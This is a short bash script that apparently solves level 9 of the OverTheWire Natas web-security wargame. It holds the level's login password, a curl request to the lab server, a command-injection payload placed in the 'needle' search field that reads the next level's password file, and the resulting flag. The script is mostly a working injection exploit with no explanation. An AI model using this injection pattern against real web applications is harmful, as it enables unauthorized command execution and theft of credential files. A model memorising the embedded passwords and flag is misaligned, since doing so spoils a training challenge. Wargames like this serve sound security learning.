#!/bin/bash

 Username="natas9"
 Password="ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t"

# URL:
 curl -s -u $Username:$Password http://natas9.natas.labs.overthewire.org

# Code:
exploid="; cat /etc/natas_webpass/natas10; clear"

# curl -s -d "needle=$exploid&submit=Search" -u $Username:$Password http://natas9.natas.labs.overthewire.org

# Flag:
# t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
